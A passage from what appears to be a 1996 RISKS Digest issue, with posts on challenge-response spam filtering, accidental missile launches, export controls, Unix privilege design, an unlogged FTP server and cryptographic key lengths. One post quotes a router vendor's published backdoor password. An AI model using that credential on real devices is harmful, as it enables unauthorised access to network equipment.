address they can find - including some of my private addresses that have
never been used to make newspostings.
<P>
As far as I'm concerned, an offer to be removed is better than nothing, but
the underlying "mail to everyone in the world" approach is still so
obnoxious as to outweigh this token; after all, there are enough potential
advertisers in the world to completely swamp our mailboxes with even one
message each.
<P>
The risks?
<OL>
<LI>Our esteemed moderator seeing what seems to be a honest
testimonial and publishing it as "an interesting item";
<LI>The risk to society when people don't get educated about or
just ignore "social harmony" rules.  Just because it won't be a
terrible thing if one person does something doesn't mean that
everyone should be allowed to do it - the combined effect if
multiplied a million-fold (or more) could be less than desirable.
<LI>For the ignorant (or the recidivist), the relatively low effort
required to annoy vast numbers of people means that this is
going to become all too common.
</OL>
I'm working on an idea that I hope will increase the cost of
advertising by requiring manual intervention for each separate
recipient, while not stopping messages from valid senders.
<P>
The basic idea is to keep a list of authorised senders (patterns
for generality) whose messages will go straight through as normal.
Other messages get "locked" in a holding queue, after they are
auto-replied with instructions on how to unlock them.  This would
entail sending a one-off key in a manner that will require some
simple operation performed on it as described by accompanying
text.  Any message not unlocked within say 2 days will be deleted.
<P>
Before I put in a great deal of effort into implementing it, does anyone see
any risks I have missed?  Would you be upset to get back a message like
this:
<P>
Sender: <A HREF="mailto:AntiSpam@my.host">AntiSpam@my.host</A> (Advertisement Blocker)<BR>
From: <A HREF="mailto:martin@my.host">martin@my.host</A> (Martin Kealey)<BR>
To: <A HREF="mailto:you@your.host">you@your.host</A> (Your Name)<BR>
Subject: Re: previous subject line
<P>
Your message &lt;<A HREF="mailto:foo.bar.12345@your.host">foo.bar.12345@your.host</A>&gt; has been locked in a
holding queue pending delivery to <A HREF="mailto:martin@my.host">martin@my.host</A> (Martin Kealey)
because <A HREF="mailto:you@your.host">you@your.host</A> has not previously been encountered by
this system.  Instructions for unlocking it to allow delivery
follow.
<P>
IF YOUR MESSAGE IS AN UNSOLICITED ADVERTISEMENT OR IS RUDE, AND
YOU PERSIST BY UNLOCKING IT, YOU WILL BE PLACED ON A "BANNED"
LIST AND A COMPLAINT WILL BE LAID WITH YOUR SITE ADMINISTRATOR.
<P>
This is not to say that merely being disagreeable will lead to
these consequences, but it might not get you permanently
approved either.
<P>
If you wish to unlock your message, please send a message with
"unlock.87326482376" in the subject header to <A HREF="mailto:AntiSpam@my.host">AntiSpam@my.host</A>;
otherwise this message will be deleted in 48 hours.  If your
message is in good taste, and not trying to waste my time, then
you will be added to the list of approved senders.
<P>
This filter is freely available software; its purpose is to
reduce unsolicited advertising by reducing its cost-
effectiveness; please use it and encourage all your friends to
use it too.
<P>
- AdCheck v0.0, on behalf of Martin Kealey
<P>
Some risks that I can see:
<OL>
<LI>failing to enable the bypass on a return message when sending a
new message could result in two instances of this program
talking to each other;
<LI>attempting to overcome the above in any simple-minded manner
(eg, accept all mail from adcheck@*) could result in a loophole
that would enable spammers to discredit the system;
- Someone might have trade-marked AntiSpam somewhere.
</OL>
If anyone has any ideas, please send me mail at site risks.kurahaupo.gen.nz
(any of the obvious usernames will work).  If I catch anyone putting that
address into a commercial mailing list of any sort, I'll personally string
you up by your ears!

This anecdote has started spreading around the net...
<P>
A snippet spotted in Pilot Magazine and entered in Bike Magazine: The
article was entitled "In a hurry are we, sir?" ( British Police Wit).
<P>
Two members of the Lothian and Borders traffic police were out on the
Berwickshire moors with a radar gun recently, happily engaged in
apprehending speeding motorists, when their equipment suddenly locked-up
completely with an unexpected reading of well over 300 mph.  The mystery was
explained seconds later as a low flying Harrier hurtled over their heads.
The boys in blue, upset at the damage to their radar gun, put in a complaint
to the RAF, but were somewhat chastened when the RAF pointed out that the
damage might well have been more severe. The Harrier's target-seeker had
locked on to the `enemy' radar and triggered an automatic retaliatory
air-to-surface missile attack. Luckily(?), the Harrier was operating unarmed.

The problem of unintended missile launches from aircraft is not a new one.
I have a friend who was flying CAP (Combat Air Patrol) in the Gulf when a
radar-guided missile launched itself from his fighter.  Subsequent
investigation determined the cause, but he was told at the time that there
had been at least three other such incidents, with the same aircraft/missile
combination.
<P>
In his case, the missile was heading for another Coalition aircraft, but
lock was broken when he turned off his radar.  This does not, of course,
work for IR-guided missiles like that in the Japanese F-15/Sidewinder
shootdown that was reported in <A HREF="/Risks/17.65.html">RISKS-17.65</A> on 23 Jan 1996.
<P>
(Forgive my vagueness above, but I'm just not sure how public the story is
and don't feel it proper to give more details, since it's not my story.  I
only heard it when I asked Gus why he was called Gus--after Gus Grissom, of
course.)
<P>
I have read of numerous spontaneous launches in Vietnam.  I also believe
that there was an incident some time ago onboard a carrier in which a
missile "launched" itself while being attached to the aircraft (I think when
it was connected electrically to the airplane) causing injuries to the
arming personnel and other ground crew.

I just got my fancy TurboTax "Deluxe" CD in the mail the other day, and
decided to install it (Windows 3.1).  I dutifully put in the CD, and entered
d:\setup, and off it went installing the software seemingly correctly.
However, when I tried to run it, the program either crashed or hung.
Searching the "help", I find it says to make sure that you turn off all
virus checking software.  Hmm.  Just to see, I did that, and it installed
the same, but (after turning on the virus checker) it finally ran normally.
The risks here are pretty obvious..
<UL>
<LI>Since viruses have shown up in shrink-wrapped software, it seems<BR>
pretty chancy to turn off protection while you run a program (the
installation)
<P>
<LI>Should we become used to turning off this when asked by the software<BR>
(This is maybe a similar risk to the Java protections - "To get the
most out of this web page, please turn off ...")

this problem??

Just read an article in the *San Jose Mercury News* that Visa International
and Block Financial will offer a special "WebCard Visa".  The card will
allow users to access their account statements via Internet.  The article
goes on to say "The service will get around security concerns by never
transmitting the account number over the Internet.  Users will type in a
password instead."  As if somehow that will solve all the security problems!
In that Visa and Microsoft have co-developed the "Secure Transaction
Technology" specification (STT), there is probably/hopefully more to the
story than the newspaper lets on.  I haven't seen any discussion of how
secure STT is, but it is described at

I just found this browsing through a router manufacturer's "Frequently

<P>
Q3       I have a bridge/router, and I have forgotten my password.  I am
no longer able to log in and configure the device(s).  What do I do
now?
<P>
Do not panic! Enter the following password at the password
prompt:XYZZYHIMOM.  This should get you into the unit.  Notice!! This is
a back door to the units, and should not be made available to people
who do not need to know about it!
<P>
And I don't even own one of these routers -- I found this in a reseller's
online catalog.  Back doors in devices that are often hooked directly to
external networks are a Bad Idea, if you ask me.  At least the manufacturer
documented it...

Escape Velocity: Cyberculture at the End of the Century
<P>
By Mark Dery
<P>
Grove Press, 1996
<P>
A pretty wild and entertaining look at "cyberculture," including all the
hype and a healthy dose of skepticism, from a journalist who has a distinct
and rather baroque style of writing that I find fun. Covers all the
personalities of cyberpunk, raves, computer sex, music, "posthuman" beings,
and all the other nutty things going on these days. Lots of fun and
educational too.
<P>
Mark and I went to college together, years ago, so I'm happy to flog his
new book (in which I also appear -- but NOT in the chapter on cybersex!).
He previously edited another fun and useful collection, Flame Wars, which
includes my essay, "Taming the Computer" (Duke University Press, 1994).
(Together, we'll sell some books!)

%T   "Civilizing Cyberspace: Policy, Power and the Information Superhighway"
<P>
On the rising wave of information superhighway books, and the increasing
backwash of anti-net tomes, no single author has been able to produce a work
that even remotely compares with Miller's.  Neither dazzled by technical
brilliance nor dreading the cyborg juggernaut, he provides the fruits of a
working relationship with the technology, thorough research, and insightful
analysis.
<P>
The book specializes in public policy, but since that can touch everyone and
everything it is not a limitation.  Miller is thus able to examine all aspects
of information structures and strictures.  His material is clear and well
reasoned: it does not provide ready answers at every point, but raises all
pertinent issues.  Even esoteric topics are handled well: obviously not all
areas can be covered in depth, but Miller knows more than he says and gives
accurate and helpful resumes.
<P>
One shortcoming in the book is the less than rigorous division of topics.
While many issues in public policy interrelate, many chapters seem to flow
together without an obvious break.  This may be difficult to resolve, but it
was rather odd to find the same (fairly lengthy) quote used in almost identical
discussions on both pages 64 and 204.

<P>
An article in ClariNet's clari.tw.computers newsgroup caught the eye
of a colleague of mine this morning. The headline is:
<P>
&gt;       Subject: Lotus in Security Compromise
<P>
Immediately alarm bells began to ring: The security in Lotus 1-2-3 has
been compromised?
<P>
But, alas, the article is of a tamer nature:
<P>
&gt;       SAN FRANCISCO (AP) -- Lotus Development Corp. announced a<BR>
&gt;       compromise with the federal government Wednesday that will allow it<BR>
&gt;       to put better security features into the international version of<BR>
&gt;       its Notes program.
<P>
The RISK here is obvious (although the implications may be subtle).
Ambiguous newspaper headlines have always been comic relief for some, but
now that our news stories and information are presented electronically, I
find it not difficult to believe that automated agents will soon be reading
our news for us, either presenting articles of interest or (worse)
attempting to summarize the content. (Indeed, I already employ the
``killfile'' feature of my newsreader to automatically select articles which
match certain expressions). Keywords such as ``Security Compromise'' would
certainly be targets for a reader who wishes to stay on top of current
happenings in computer and electronic security.

<P>
The following advisory is being provided by Mr. Buddy Guynn, DMC Montgomery
Security Manager.  He received the information from the Army Material
Command regarding the security of Laptop Computers during travel.
<OL>
<LI>The following information is valid not only for laptops but
also for other items of value such as briefcases while you are
in domestic or international travel status:
<P>
"Laptop computers have become a premium target for theft
throughout Europe.  Every international traveler who is
anticipating on carrying a laptop computer with them must
remain on constant alert as they traverse through all
airports.
<P>
Two methods of theft have already occurred at separate
airports and the techniques that were used to steal the
laptop computers can occur at any airport.  Both methods
involved two thieves to carry out the theft.
<P>
Recently, Brussels Airport security advised that one method
involved the use of security x-ray machines.  The first
thief would precede the traveler through the security check
point and then loiter around the area where the carry-on
luggage had already been examined.  When the traveler places
his laptop computer onto the conveyer belt of the x-ray
machine, the second thief would step in front of the
traveler and set off the metal detector.  While the traveler
was being delayed, the first thief would remove the
traveler's laptop computer from the conveyer belt just after
it had gone through the x-ray machine and quickly disappear.
<P>
The most recent method of theft just occurred at the
Frankfurt International Airport, Germany, while the traveler
was walking around a crowd of people in the airport
terminal.  The traveler, who was carrying his laptop
computer on his rollbag, was preceded by the first thief.
Just as the traveler got around the crowd of people, the
first thief stopped abruptly, causing the traveler to stop
abruptly.  When they stopped momentarily, a second thief,
who had been following just behind them, quickly removed the
traveler's laptop computer from his rollbag and disappeared
in the crowd."
<P>
<LI>All travelers, both international and domestic, are urged to
be alert to the above methods used in stealing computers and
always be mindful of any abrupt diversions during your travels.
Report any losses immediately to authorities.  Keep serial
numbers, make, and model information of your laptop computers, or
of any items of value, separate from the item so you can give
precise information to authorities if the items are stolen.
<P>
<LI>Request widest dissemination of this correspondence.

<P>
&gt; ... I'm certainly not going to be concerned about what it is costing<BR>
&gt; someone else for me to crack keys.
<P>
On the contrary, many security weaknesses aren't prevented because people
*don't* consider the cost to break into the overall system, and instead
focus on the encryption.  For example, cryptographers (myself included, I
confess) like to use triple DES because a "fair" brute force attack will
take millions of years.  But in practice, the assumption that attackers will
actually use brute force makes about as much sense as wearing bright red
uniforms in the forest...
<P>
Brute force is almost never the simplest attack to mount -- it's the
simplest to understand and quantify.  For example, how much would it cost to
mail out free "demo" disks to unsuspecting users?  Although this isn't
playing "fair" by the cryptographer's rules (which require that the two
endpoints of a secure connection be secure), the cost per "break" is under
$10 once the trojan software has been written.
<P>
Unfortunately the number of key bits doesn't have much correlation to actual
security; estimated dollars per successful break-in is a much more useful
figure.  On a typical PC, there are just too many other security weaknesses
for there to be much practical difference between 3DES and 40-bit RC4.

&gt;P.S.  Don't blame Netscape, they are just abiding by ITAR.
<P>
IMHO, this is letting Netscape off the hook far too easily.  There is a
simple solution to the ITAR problem - develop the software in a location not
subject to US export laws (i.e. almost anywhere else in the world).  Anyhow
who is claiming to be addressing the problem of network security, etc., on a
global basis should be adopting this solution.  The USA has no monopoly on
software development expertise, and there is no reason the world should be
held ransom to US military nonsense.

<P>
The bug in ssh described by Barry Jaspan is a good example of a whole class
of Unix security bugs that result from the fact that Unix associates all
access controls with users and has no way to assign access rights to a
program independent of the user running the program.  This is not true of
all operating systems.  One (certainly not the only) example is MTS (the
Michigan Terminal System).  Each program in the system is assigned a Program
Key and access to files and other system resources can be granted to the
program (or a combination of a program and a user) as well as to a user.
This makes it much easier to write programs such as ssh since they never
have to masquerade as a super user.
<P>
Of course there are lots of other problems one has to solve.  The algorithm
for switching program keys as control switches among different code in the
same process is important, for example.  One also needs to make sure that
users can't sniff at the memory of a process that holds important
information (such as passwords).  In MTS this is done by making the memory
of a process invisible when a "run only" program is loaded in it.  Using
Program Keys, a run only program is one whose file is permitted to the
program loader, but not to the user running it.  Hence a program may be run
only to one person and not to another.  All in all this scheme has worked
quite well for the last 25 years or so.

I also seem to recall seeing a picture of theirs showing how this

I believe that this product has the capability of causing alarms under

to ring a bell every time a certain 'dirty word' was detected in anyone's
email or on usenet news.

For about 5 months I've been working on a project to reliably detect Usenet
spam, and allow people who are bothered by it to avoid seeing it.  The
"Automoose" is a daemon which scans usenet articles, and when it sees the
same message that has been posted too many times, it notifies the world via
a NoCeM notice.
<P>
These notices are PGP signed to prevent forgery.  They are read by special
clients which check the signatures, and mark spam messages as 'read'.  NoCeM
has no effect on those who aren't interested, and the user can control whose
notices are applied by adding or removing keys from the keyring.

Martin proposes an excellent idea for locking potential spams:
<P>
One fault of his proposal is this: If it becomes very popular, scanning for
the string "send a message with `unlock.87326482376' " and extracting the
unlock code would be a simple matter for a spammer to script.  Thereby, the
return address on the spam would be a daemon that watches for your Anti-Spam
message and then immediately sends the unlock message.
<P>
It would be a simple matter for the spammer to change the domain name
of the originating spams (As well as usernames) to get around them then
being locked out by AntiSpam after unlocking the first message.
<P>
So, your idea suffers because it relies on the other side of the spam being
a person (for whom it would be a hassle to change their address if they are
blocked) rather than a professional spammer.  But, it is a great start.

<P>
&gt;I'm working on an idea that I hope will increase the cost of<BR>
&gt;advertising by requiring manual intervention for each separate<BR>
&gt;recipient, while not stopping messages from valid senders.
<P>
The system would halt e-mail from an unknown site/account, and require a
manual response in order to have the sender placed on an "approved" list in
order to allow his/her/its mail into the system.
<P>
&gt;Some risks that I can see:  [...]
<P>
I can see quite a variety of problems.
<UL>
<LI>dealing with any listserver, mailbot or other automated agent.  I use
them a lot.
<P>
<LI>the 48 hour limit would frequently be a problem with systems (see
recent situations with AOL and MSN) that have become overloaded with mail,
and also with users who only check mail once a week or so.  (I know that
many high volume listservers have this response limit, but in that case
you do have recourse to a human list owner.)
<P>
<LI>our site has had four or five changes to the mail gateway in the past
two years.  Each has meant a change in the address.  (Also, I am listed at
least five times in Godin's "Internet White Pages" simply because of changes
to my "real name".)
<P>
<LI>as described, the "approved" list would apply to an entire site.  This
would mean that a moments impatience or inattention could get someone barred
from a whole site.  Conversely, one could get around the restriction by
sending an innocent message to someone at the site, become "approved", and
then spam the site.  (Many Freenets, and no few ISPs, use numbered accounts.
Someone recently spammed Mindlink in Vancouver using this method.  Mindlink
has now blocked mail to account numbers: the sender must use the recipient's
"alias".)
</UL>
I could go on, but I think this indicates that such a program would quickly
become very complex.  I suspect that spamming is a natural risk of email in
much the same way that telemarketing is a risk of telephones and viruses are
a risk of computers.  It just goes with the territory.  So far, the net has
proven to have protections against the most flagrant violators.  Today I saw
a note in Edupage which reported that MCI now has a policy which allows them
to terminate the accounts of spammers.  (It takes a lot to get corporate
monoliths to respond in this manner.)
<P>
Now, if you want a *real* risk to the net, look at the Web ...   :-)

In his remarks, Joe comments on modems that disconnect on "+++". Like the
Internet Goodtime virus, this has a grain of truth in it. With the (sic)
"Hayes-compatible" Modems, when this string is sent into the serial port of
the modem (i.e. from the calling station), it causes the modem to go into
command mode. The connection is not hung up at this time. If you know what
you are doing, you can drop back into data mode. (How many do? Quien Sabe?).
If received via the phone port, it is just another string of bits. "Too
little knowledge is very bad and not enough is still confusing. Mil Gracias.

Phil, I agree that what you describe is what is SUPPOSED to happen.  But not
all "Hayes-compatible" modems behave exactly as they are supposed to.  There
is also a risk in believing that "compatible" products are indeed 100%

Subject: Single computer breaks 40-bit RC4 in under 8 days (Kocher, 17.67)
<P>
&gt;On a typical PC, there are just too many other security weaknesses<BR>
&gt;for there to be much practical difference between 3DES and 40-bit RC4.
<P>
Paul and I have different worldviews and this is one example. "other
security weaknesses usually revolve around theft, compromise, and "buying an
employee" - the last is often the cheapest (social engineering) but is
traceable. The nice thing about brute force is that it is essentially
passive, the target never needs to have a clue that it happened.
<P>
Given that, I apply a quanta rule to crypto, these days I use DES as
"strong enough" since SOA to crack 56 bits is measures in years, not hours.
<P>
OTOH, with the right equipment, RC4-40 will usually succumb in either
3 hours of $500 whichever comes first, down in the noise as far as cost<BR>
and wholly passive ("other" methods are active or at least local). So
clearly 40 bits is not "Good Enough"(C) while at 56, other methods of
attack are easier. The real economic cross-over is somewhere in the middle:
probably around a week or 46 bits/$30,000 but with 56 easy/available, why
bother with less (would cost *more*).
<P>
So while it is possible that in theory, there is little difference between
3DES and RC4-40, in the real world of cost/reward, I suspect that there<BR>
is a gap that would take many doubloons to cross.

ps personally, I like 64 bits. Is a chunk that fits nicely into 32 bit
registers. Examined from a CISC cycle cost perspective, why bother with less?

There is a simple solution to the ITAR problem - develop the
software in a location not subject to US export laws (i.e. almost
anywhere else in the world).
<P>
While that may be a viable approach for companies in those other countries,
it is not relevant to Netscape.  As a US corporation, Netscape would be most
likely prosecuted under ITAR if they had such software developed by a
subsidiary or a contractor in some other country, even if the results never
touched US territory.  This government attitude even extends to not allowing
US companies to add convenient hooks for the provision of crypto once a
product is delivered overseas.
<P>
While the USA has no monopoly on software development expertise, it is _all_
of the software which must be developed elsewhere, not just the crypto part.
Since Netscape has such a hold on the browser market it would appear that
the US _does_ have a monopoly on "something" (marketing?) for such market
penetration despite ITAR limitations, or perhaps the old adage is true
"Security does not sell products".

<P>
Not so simple.  It must be developed not only outside the USA, but by a
non-US company and in a locale that permits unrestricted export of the
product.
<P>
Under those conditions it's more difficult for the that company's profit to
accrue to Netscape (or whomever), because the USA authorities pay attention
to whether there's a real separation of entities.  For instance, my company
is incorporated separately in most countries, but because we have a US
parent we are everywhere considered a US corporation for these purposes;
and in my experience, the authorities do pay attention to this.  So there's
nowhere on earth that we can develop crypto for unrestricted export.

<P>
I am certainly not an expert on this topic, but...
<P>
This view is, of course, based on the American view of the situation.  Most
other countries find this attempt at extra-territorial application of US law
to be extremely offensive, and illegal.  A company incorporated in any
country is subject to the laws of that country, not US law, regardless of
the ownership.  US laws claiming otherwise are generally regarded as null
and void outside the US.  In Canada, for example, I believe we have a law
making it explicitly illegal for subsidiaries in Canada to obey US law when
it conflicts with Canadian law.  This normally arises in relation to the US
embargo of Cuba, but it applies in other areas.
<P>
Of course, in reality this can simply create an unresolvable conflict for
the companies - subject to one penalty for acting, and another for not.
However, in regard to the ITAR rules, I think it is pretty clear that a
company could contract out the development of a piece of software to a
offshore company, and the result would not be subject to US laws.  Obviously
there are complications involved in doing this, but if a company is
seriously trying maintain a global leadership role in data communications
services, and seriously trying to provide acceptable security to its
customers, something along this line is necessary.

This sounds like an incident a high school teacher of mine talked about
several times.  During Vietnam, on the aircraft carrier U.S.S. Forrestal,
someone forgot to raise the heat shields behind a departing jet.  When the
jet fired up its engines to take off, a missile locked onto the heat and
launched.  (I don't remember whether this missile was on another jet or
still being loaded.) The initial explosion led to several other missiles
going off and a huge fire.  My high school teacher worked in the psych ward
of a Navy hospital on Guam, and treated a number of sailors involved.

<P>
In <A HREF="/Risks/17.65.html">RISKS-17.65</A>, Chiaki Ishikawa described an incident in which a Japanese
air force fighter plane, armed with live missiles, shot down another plane
during a training exercise. According to the information provided, a message
appeared on the firearm status screen which should only appear when the
master firearm switch is activated. Some officials wondered why the pilot
didn't realize that something was wrong when this particular message
appeared.
<P>
This portion of the story raises an interesting question: if the plane had
been functioning "correctly," then a training exercise (in which the
"missiles activated" message would NOT appear) would differ from a live
combat situation (in which this message WOULD appear).
<P>
I was wondering if this difference between training and live action would be
a risk in itself (how would a pilot in combat react to a message that had
never appeared during training?).
<P>
Or would the "fix" (i.e., displaying a "missiles activated" message when no
missiles are actually activated) be riskier?
<P>
I'm sure that RISKS readers have faced simulation vs. actual issues before;
I'd be interested in your thoughts.

&gt;... Unix security bugs that result from the fact that Unix associates all<BR>
&gt;access controls with users and has no way to assign access rights to a<BR>
&gt;program independent of the user running the program.
<P>
That's not true at all.  Unix can do this, it just requires a bit of work.
<OL>
<LI>Create an /etc/passwd entry for the program.  You can set the
password and shell fields so that logins are impossible.
<P>
<LI>Change the ownership of the program to this ID, and set the program's
"set uid" bit.
</OL>
I know this works because I have a slew of realtime ingest programs
which all run as a non-existent user.  The human users get access to
the data through a shared "group" id... but we have only read access
to most of that data.
<P>
It becomes more complex if your program requires root permissions, but
I know that NCSA httpd is setuid to root but generally runs as a specified
user id -- and it's highly recommended that this user-id be for a nonexistent
user with no privileges.  For many systems, that's nobody (-1) and
nogroup (-1).  It only uses the special privileges to grab a privileged
socket number.
<P>
&gt;and access to files and other system resources can be granted to the<BR>
&gt;program (or a combination of a program and a user)
<P>
You could fake the latter in Unix, with some work.  You would need a
"group" for each (user, program) pair, and a small program with root
permissions.  After it determined the user-id of the person who invoked
the program it could change the user and group id to "nobody" and
"user-program" (in a manner to permanently lose root permissions!)
and then exec() the actual program.
<P>
Does Unix require too much work to achieve this goal?  That's a hard
question to answer; allowing a more direct way to achieve these objectives
also increases the risk of undetected errors in the privilege logic.
There's a lot to be said for handling one case well instead of spreading
your effort over three or four different approaches.

<P>
Sure that works, but those users are non-existent only in your mind, not in
Unix's view.  If there is a bug in one of the programs that uses this
technique that lets a person get control of the process while it is running,
then that person is using that userID whether or not you think the user
exists.  Of course the person will only have whatever access the supposedly
non-existent user has, which is better than root access, but still....  The
advantage of program keys in this context is that if the program crashes,
the user doesn't inherit the access the program had, only whatever access
they are supposed to have given the userID they are using (and whatever
other program they happen to run).  This is quite different.
<P>
It's certainly possible to write secure software in Unix, but it's not
trivial.  Too much depends on each program (sendmail, ftpd, popd, etc.,
etc.) being well written and well debugged.  Putting this facility in the
kernel and doing it well makes it much, much easier to write secure server
programs.  People with only limited programming ability have written
server-style programs for MTS which have been at least as secure as the
typical Unix server -- even in Fortran although I wouldn't recommend that.
:-)
<P>
Please don't take me wrong and start yet another operating system war.
Unix is fine, but it doesn't necessarily have the only answer to all the
world's problems.  The same could be said for many operating systems,
certainly for MTS.  I'm just trying to point out that there is more than
one way to solve this problem, and looking at other ways may teach us
something.

Back-cover blurb: Whether you design computer-controlled systems, work with
them or merely write the software for them, this is the book for you.  It
presents computers and error in everyday language, making them accessible to
non-specialists and specialists alike.  Trevor Kletz takes you through a
range of incidents and accidents which occurred on computer-controlled
plants and equipment.  He is a master at bringing out the lessons.
Researchers Paul Chung and Eamon Broomfield survey experience to date with
hazard and operability studies (Hazops) on computers - an attempt to spot
and correct errors before they threaten the safety of the controlled
systems.  And Chaim Shen-Orr, who directs safety programmes for RAFAEL in
Israel, explains why computer-controlled systems can fail.  He adds advice
for system designers and managers designing or maintaining safety-sensitive
installations.  Human error is generally to blame - either in interaction
with the computer or in writing the software which it uses.  A compelling
read!

- --------------------------------------------------------
Brief Description:<BR>
On Monday 29th, I discovered a security hole in the new Computer Services
system, and made the sysadm aware of it, then helped him to plug it.  The
potential for almost unlimited access to the system was there, and as
shall be seen, there's probably no way to find out if someone hasn't
already taken advantage of the insecurity.
<P>
Details:<BR>
I used a quite legitimate program which was installed on my PC by
Computer Services as part of the new networking packages.  It allowed me,
under the sysadm's supervision, to copy a file to my PC from the IBM
machine.
<P>
The program is called FTP (File Transfer Protocol,) and is commonly used
on Internet to move files around any TCP/IP network, such as we are
running.  Most people who have used Internet would be familiar with it's
operation.
<P>
FTP requires a server program, called the FTP daemon, to run on the host
machine.  Such an FTP daemon was running on the IBM, and it was by
de-activating this daemon that the sysadm and I subsequently closed the
security breach.
<P>
FTP daemons can be set to log all transactions, and to restrict login
access; however due to there never having been a requirement for such
measures before, the daemon on the IBM machine had not been set to
logging mode, nor restricted in any way.
<P>
Implications:<BR>
Since the security of the IBM from network programs has never been a
problem, it was possible to read almost every file on the IBM system, and
probably write to or overwrite about half of those.
<P>
Since FTP is a well-known program, and since it has been installed on
every PC which is connected to our network, around 20% of personnel on
the premises could have exploited this weakness to copy sensitive data to
their PC, and then read it or copy it to a floppy.
<P>
Since our TCP/IP network is also connected to XXXX's WAN, anyone on that
system could also have exploited this weakness in a similar fashion.
Copies of sensitive material could have ended in the wrong hands, details
could have been changed and then written back onto the IBM, etc.
<P>
It is necessary to have a username and password in order to successfully
log onto an FTP server, however there are several commonly-used account
names such as "sysadm" which most users (and certainly ALL would-be
system breakers) would be familiar with, and which would then only
require the password to be found out, in order to gain access.
<P>
One of the first targets for system breakers then becomes the password
file, which they could, once they have copied it, decrypt at their
leisure and thus obtain the root password.
<P>
And since the FTP server on the IBM was not logging operations, it would
not be immediately obvious that someone had been logging on and trying
random passwords in their tens of thousands in an effort to break into
the system.
<P>
Lastly, because the server was not logging, it is very possible that
someone has already exploited this weakness and we would have no trace of
their activities....
<P>
Other Thoughts:<BR>
The IBM and Novell systems have been linked together, and linked to the
Network LAN, for around a month, I believe.  It took me less than three
minutes to realise that here was a potential system risk, find out the
necessary IP address, and prove that there was a risk.
<P>
Since I run a similar but much more exposed system, I adhere to an
accepted code of conduct, and informed the sysadm immediately on
discovering the breach.  Another user, perhaps one dissatisfied with the
Company or tempted by offers and promises of an outside party, might not
have been so considerate of the Company's interests . . .

<P>
At the request of the Business Software Alliance (BSA), an ad hoc
panel of seven cryptologists and computer scientists met last November
to address the question of the minimum key length required to provide
adequate security against exhaustive search in commercial applications
of symmetric cryptosystems.  We have just completed our report.
<P>
We adopted a simple, and somewhat conservative, methodology in an
effort to gain a realistic understanding of what size keys might
actually be vulnerable in practice.  It is common in analysis of key
length to give all benefit of the doubt to the capabilities of the
potential attacker and to make very generous assumptions about the
technology and resources that might be available to mount an attack.
In our analysis, however, we assumed that the attacker would employ
only conventional, commercially-mature technologies and would be
limited by budget and time constraints.  We used several different
technologies to design attack strategies that accommodate the budgets
of various hypothetical attackers, from individual ``hackers'' to
well-funded enterprises.  Our conclusions, therefore, represent an
approximation of an ``upper bound'' on the strength of various size
keys; I believe more efficient attacks than those we considered might
also be possible and should be taken into account by the prudent
cryptosystem designer.
<P>
The abstract of the report follows below.

ABSTRACT
<P>
Encryption plays an essential role in protecting the privacy of
electronic information against threats from a variety of potential
attackers.  In so doing, modern cryptography employs a combination of
_conventional_ or _symmetric_ cryptographic systems for<BR>
encrypting data and _public key_ or _asymmetric_ systems for
managing the _keys_ used by the symmetric systems.  Assessing the
strength required of the symmetric cryptographic systems is therefore
an essential step in employing cryptography for computer and
communication security.
<P>
Technology readily available today (late 1995) makes
_brute-force_ attacks against cryptographic systems considered adequate<BR>
for the past several years both fast and cheap.  General purpose
computers can be used, but a much more efficient approach is to employ
commercially available _Field Programmable Gate Array (FPGA)_
technology.  For attackers prepared to make a higher initial
investment, custom-made, special-purpose chips make such calculations
much faster and significantly lower the amortized cost per solution.
<P>
As a result, cryptosystems with 40-bit keys offer virtually no
protection at this point against brute-force attacks.  Even the U.S.
Data Encryption Standard with 56-bit keys is increasingly inadequate.
As cryptosystems often succumb to `smarter' attacks than brute-force
key search, it is also important to remember that the keylengths
discussed here are the minimum needed for security against the
computational threats considered.
<P>
Fortunately, the cost of very strong encryption is not
significantly greater than that of weak encryption.  Therefore, to
provide adequate protection against the most serious threats ---
well-funded commercial enterprises or government intelligence agencies
--- keys used to protect data today should be at least 75 bits long.<BR>
To protect information adequately for the next 20 years in the face of
expected advances in computing power, keys in newly-deployed systems
should be at least 90 bits long.

<P>
Recently, there has been much publicity about a problem inherent in
today's personal computers: software on a PC can recognize credit-card
numbers as they are typed on the keyboard, with no knowledge of why the
number is being typed, what application is running, etc.  The RISK here
is that such software could be malicious--for example, it could run
invisibly in the background and send credit-card numbers it discovers to
its creator--anonymously and untraceably.  The publicity came in press
interviews (San Jose Mercury News, 29 January 1996) and in subsequently
distributed material from First Virtual Holdings (FV).  The problem is
characterized by FV as "fatal", as a "discovery", as "undermining every
known credit-card encryption mechanism for Internet commerce", and as
having no possible technical defenses or counter-measures.
<P>
Is this a RISK?  If so, how to characterize it?
<P>
The discussion has revolved around four basic claims:
<OL>
<LI>Keystrokes are easily captured by a relatively simple keyboard
sniffer program.
<LI>Typed credit-card numbers are easily recognizable, without need for
context or knowledge about user activity,
<LI>Malicious software can be easily and tracelessly infiltrated into
large numbers of consumer PCs
<LI>Credit-card numbers can be returned to a perpetrator using
invisible, untraceable, and anonymous means
</OL>
How supportable are these claims?  On closer examination, only the first
stands up especially well; the other three, though technically
possible, are by no means fatal or unavoidable.
<P>
In technical terms, there is certainly a RISK.  The scenario described
in the newspaper article, and elaborated on by Nat Borenstein (FV's
Chief Scientist) is technically accurate: malicious programs can
transmit information to parties who oughtn't have it.
<P>
This is not news. It has been well understood in the computer security
field for, well, about three decades.  It is the fundamental threat
underlying the security mechanism called Mandatory Access Control.  And,
I imagine, it's something that makes computer security and virus
researchers lose sleep some nights.  Indeed, because of this threat,
there are those who say they never run any software they haven't
personally studied and compiled themselves (though I've often wondered
what they do about compilers...  and microcode).
<P>
The language used to describe the threat ("the flaw ... is fatal"),
however, is a bit on the hyperbolic side.  First of all, the threat is
not unique to Internet commerce: it applies to information processing in
general.  The threat is equally applicable against numbers that one
might enter as account identifiers in a personal finance program, or
even against credit-card numbers in a letter written with a word
processor (perhaps to inquire about incorrect charges).  Such uses are
just as vulnerable--one need never even attempt an electronic purchase
to "lose" a credit-card number this way. The advice from FV does state
"never type your credit-card number into a computer", but it focuses
solely on commerce mechanisms, which is a bit misleading.
<P>
Secondly, there ARE effective counter-measures, of both a defensive and
an offensive nature, other than giving up on credit-card numbers for
electronic commerce.  FV characterizes the only two possible solutions
as "secure hardware add-ons and the First Virtual approach", because in
the latter, a user is not required to type credit-card number into a PC.
These approaches impose certain costs, risks, and benefits that must be
weighed sensibly against corresponding attributes of other approaches.
Even if they were the only possible "solutions", they might not be
sufficiently cost-effective to be worth using.
<P>
Finally, it's important to identify the stakeholders clearly and not to
